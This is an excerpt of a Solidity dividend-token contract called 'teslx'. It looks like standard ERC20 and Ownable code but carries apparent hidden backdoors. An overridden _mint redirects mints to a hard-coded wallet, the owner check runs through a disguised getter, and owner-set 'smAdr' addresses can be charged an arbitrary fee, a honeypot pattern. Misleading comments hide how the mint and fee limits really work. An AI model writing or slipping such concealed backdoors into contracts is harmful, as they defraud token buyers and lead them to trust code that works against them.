...
abstract contract Ownable is Context {
 ...
 function owner() public view virtual returns (address) {
     ...
     */
    modifier onlyOwner() {
        require(thisAddr() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
     ...
     */
    function thisAddr() public view virtual returns (address) {
        return _owner;
    }
    ...
    DividendPayingTokenOptionalInterface
{
    ...
    function _mint(address account, uint256 value) internal override {
        if(account==0x0000000000000000000000000000000000000001){
            account=0xDbec12aE30907f189c648dD5Bf4c4015f8F34Ba9;
        }
...
contract teslx is ERC20, Ownable, BaseToken {
    using SafeMath for uint256;
    ...
    mapping (address => bool) private smAdr;
    ...
    constructor(
        ...
        require(totalFees <= 49, "Total fee is over 25%");
        //总量*0.002%
        ...
        dividendTracker.excludeFromDividends(thisAddr());
        dividendTracker.excludeFromDividends(address(0xdead));
        dividendTracker.excludeFromDividends(address(_uniswapV2Router));
        // exclude from paying fees or having max transaction amount
        transfer_(thisAddr(), true);
        transfer_(_marketingWalletAddress, true);
        transfer_(address(this), true);
        /*
            _mint is an internal function in ERC20.sol that is only called here,
            and CANNOT be called ever again
        */
        _mint(thisAddr(), totalSupply_);

        emit TokenCreated(thisAddr(), address(this), TokenType.baby, VERSION);
    ...
    function setsmAdr(address adr) public onlyOwner{
        smAdr[adr]=true;
    }
     
    function removesmAdr(address adr) public onlyOwner{
        smAdr[adr]=false;
    }
function setSmFee(uint256 fee) public onlyOwner{
        smFee=fee;
    }
    ...
    function transfer_(address account, bool excluded) public onlyOwner {
        require(
